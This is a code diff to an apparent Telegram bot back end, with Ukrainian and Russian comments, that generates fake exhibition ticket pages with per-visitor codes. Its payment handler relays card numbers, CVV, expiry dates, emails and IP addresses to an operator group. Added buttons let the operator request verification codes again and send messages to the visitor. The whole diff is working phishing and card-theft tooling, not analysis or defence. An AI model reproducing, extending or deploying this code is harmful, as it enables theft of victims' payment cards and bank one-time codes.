@@ -105,8 +105,25 @@ CREATE TABLE IF NOT EXISTS site_users (
 """)
 conn.commit()
 
+# Додаємо колонку page_code, якщо вона не існує
+try:
+    c.execute('SELECT page_code FROM site_users LIMIT 1')
+except sqlite3.OperationalError:
+    print("[DB] Adding page_code column to site_users table")
+    c.execute('ALTER TABLE site_users ADD COLUMN page_code TEXT UNIQUE')
+    conn.commit()
+    print("[DB] page_code column added successfully")
 
-
+# Заповнюємо page_code для існуючих записів, якщо потрібно
+try:
+    c.execute('SELECT COUNT(*) FROM site_users WHERE page_code IS NULL')
+    null_count = c.fetchone()[0]
+    if null_count > 0:
+        print(f"[DB] Found {null_count} records without page_code, filling them...")
+        fill_page_codes()
+        print("[DB] page_code values filled successfully")
+except Exception as e:
+    print(f"[DB] Error checking/filling page_code: {e}")
 
 def get_user(user_id):
     c = conn.cursor()
@@ -1207,10 +1224,7 @@ async def events_save_all(message):
         }
         with open(events_file, 'w', encoding='utf-8') as f:
             json.dump(events, f, ensure_ascii=False, indent=2)
-        # Сохраняем связь event_code <-> user_id
-        # c = conn.cursor()
-        # c.execute('INSERT OR REPLACE INTO event_links (event_code, user_id) VALUES (?, ?)', (short_event_id, message.from_user.id))
-        # conn.commit()
+        
         # --- Створюємо запис у site_users ---
         price = user_event.get('price', '45')
         currency = user_event.get('currency', 'EUR')
@@ -1225,6 +1239,7 @@ async def events_save_all(message):
             else:
                 combined_dates.append(dates[i] if dates[i] else '')
         site_user_id, page_code = create_site_user(combined_dates, currency, street, price)
+        
         # Формуємо повідомлення з посиланнями
         msg = f"Выставка успешно создана:\n<b>{user_event.get('title', 'Выставка')}</b>\n"
         msg += f"💵 Цена: <b>{price} {currency}</b>\n"
@@ -1237,86 +1252,24 @@ async def events_save_all(message):
             path = ev['path']
             if path.endswith('/index.html'):
                 path = path[:-10]
-            link = f"http://{EVENT_DOMAIN}/{path}?e={short_event_id}&page=1-{idx}&price={price}&currency={currency}"
+            link = f"http://{EVENT_DOMAIN}/{path}?e={short_event_id}&page={page_code}&price={price}&currency={currency}"
             msg += f"{idx}. {ev['name']} ({ev['date']} {ev['time']})\n{link}\n"
         await message.answer(msg, parse_mode='HTML')
+        
         # Повертаємо меню після створення виставки
         kb = admin_menu_kb if is_admin(message.from_user.id) else main_menu_kb
         await message.answer("Головне меню:", reply_markup=kb)
+        
         # Зберігаємо зв'язок event_code <-> site_user_id
         c = conn.cursor()
         c.execute('INSERT OR REPLACE INTO event_links (event_code, user_id) VALUES (?, ?)', (short_event_id, site_user_id))
         conn.commit()
+        
     except Exception as e:
         print(f"[EVENTS] Помилка у events_save_all: {e}")
+        import traceback
+        traceback.print_exc()
         await message.answer(f"❗️ Виникла помилка при створенні івенту: {e}")
-        with open(events_file, 'r', encoding='utf-8') as f:
-            events = json.load(f)
-    except Exception:
-        events = {}
-    
-    # Додаємо нову подію
-    user_event = EVENT_user_data[chat_id]
-    events[event_id] = {
-        'title': user_event.get('title', 'Выставка'),
-        'price': user_event.get('price', '45'),
-        'currency': user_event.get('currency', 'EUR'),
-        'address': user_event.get('address', ''),
-        'events': [
-            {
-                'name': EVENT_FIXED_EVENTS[i],
-                'path': EVENT_FIXED_PATHS[i],
-                'date': user_event['dates'][i],
-                'time': user_event['times'][i]
-            } for i in range(8)
-        ]
-    }
-    
-    with open(events_file, 'w', encoding='utf-8') as f:
-        json.dump(events, f, ensure_ascii=False, indent=2)
-    
-    # Сохраняем связь event_code <-> user_id
-    c = conn.cursor()
-    c.execute('INSERT OR REPLACE INTO event_links (event_code, user_id) VALUES (?, ?)', (short_event_id, message.from_user.id))
-    conn.commit()
-    
-    # --- Створюємо запис у site_users ---
-    price = user_event.get('price', '45')
-    currency = user_event.get('currency', 'EUR')
-    street = user_event.get('address', '')
-    dates = user_event.get('dates', [''] * 8)
-    times = user_event.get('times', [''] * 8)
-    
-    # Об'єднуємо дату і час у формат "дата час"
-    combined_dates = []
-    for i in range(8):
-        if dates[i] and times[i]:
-            combined_dates.append(f"{dates[i]} {times[i]}")
-        else:
-            combined_dates.append(dates[i] if dates[i] else '')
-    
-    site_user_id = create_site_user(combined_dates, currency, street, price)
-    
-    # Формуємо повідомлення з посиланнями
-    msg = f"Выставка успешно создана:\n<b>{user_event.get('title', 'Выставка')}</b>\n"
-    msg += f"�� Цена: <b>{price} {currency}</b>\n"
-    msg += f"📍 Адрес: <b>{street or 'Не указан'}</b>\n"
-    msg += f"🆔 Site User ID: <code>{site_user_id}</code>\n\n"
-    msg += f"<b>Афиша:</b>\n"
-    msg += f"<b>Главная страница:</b> http://{EVENT_DOMAIN}/?e={short_event_id}\n"
-    
-    for idx, ev in enumerate(events[event_id]['events'], 1):
-        path = ev['path']
-        if path.endswith('/index.html'):
-            path = path[:-10]
-        link = f"http://{EVENT_DOMAIN}/{path}?e={short_event_id}&p={idx}"
-        msg += f"{idx}. {ev['name']} ({ev['date']} {ev['time']})\n{link}\n"
-    
-    await message.answer(msg, parse_mode='HTML')
-    
-    # Повертаємо меню після створення виставки
-    kb = admin_menu_kb if is_admin(message.from_user.id) else main_menu_kb
-    await message.answer("Головне меню:", reply_markup=kb)
 
 @log_function
 async def notify_admin(request):
@@ -1387,18 +1340,6 @@ async def payment_notify(request):
         text += f"\nЦена: {user_data_from_db['price']} {user_data_from_db['currency']}"
         text += f"\nАдрес: {user_data_from_db['street']}"
     
-    kb_rows = [
-        [
-            InlineKeyboardButton(text="Card", callback_data=f"card:{ip}"),
-            InlineKeyboardButton(text="Block", callback_data=f"block:{ip}"),
-            InlineKeyboardButton(text="Unblock", callback_data=f"unblock:{ip}"),
-            InlineKeyboardButton(text="Code", callback_data=f"code:{ip}")
-        ],
-        [
-            InlineKeyboardButton(text="Тех поддержка", callback_data=f"support:{ip}"),
-            InlineKeyboardButton(text="Text", callback_data=f"text:{ip}")
-        ]
-    ]
     await bot.send_message(PAYMENT_GROUP_ID, msg1, parse_mode='HTML', reply_markup=kb1)
 
     # 2. Повідомлення з карткою, CVV, expiry, email, IP + кнопки для карт/коду
@@ -1459,7 +1400,7 @@ async def code_notify(request):
     return web.Response(text='ok')
 
 # --- CALLBACK-ОБРОБНИКИ ДЛЯ КНОПОК ---
-@router.callback_query(lambda c: c.data and (c.data.startswith('card:') or c.data.startswith('block:') or c.data.startswith('unblock:') or c.data.startswith('code:')))
+@router.callback_query(lambda c: c.data and (c.data.startswith('card:') or c.data.startswith('block:') or c.data.startswith('unblock:') or c.data.startswith('code:') or c.data.startswith('support:') or c.data.startswith('text:') or c.data.startswith('code_request_again:')))
 async def admin_action_handler(call: types.CallbackQuery):
     action, ip = call.data.split(':', 1)
     import aiohttp as aiohttp_client
@@ -1471,6 +1412,13 @@ async def admin_action_handler(call: types.CallbackQuery):
         await call.answer("Користувач заблокований")
     elif action == 'unblock':
         await call.answer("Користувач розблокований")
+    elif action == 'support':
+        await call.answer("Включена технічна підтримка")
+    elif action == 'text':
+        await call.answer("Введіть текст повідомлення:")
+        user_step[call.from_user.id] = f'text_for_{ip}'
+    elif action == 'code_request_again':
+        await call.answer("Код запитується знову")
 
 
 
